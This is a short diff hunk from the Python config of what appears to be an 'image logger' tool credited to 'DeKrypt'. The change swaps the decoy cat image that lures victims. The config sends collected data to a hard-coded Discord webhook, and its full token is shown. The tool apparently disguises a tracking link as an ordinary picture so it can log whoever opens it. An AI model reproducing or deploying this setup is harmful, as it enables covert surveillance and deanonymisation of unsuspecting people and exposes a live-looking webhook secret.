@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1563995477287116890/tTRsmFs2_yEzBdAd5ErEzIzx7zBbmB6icWx-yG0HmwSXE37t8mksgF_Hv4BgcX1KMrNC",
-    "image": "https://static.wikia.nocookie.net/battle-cats/images/9/98/213_1.png/revision/latest?cb=20150916191832", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/4/4d/Cat_November_2010-1a.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
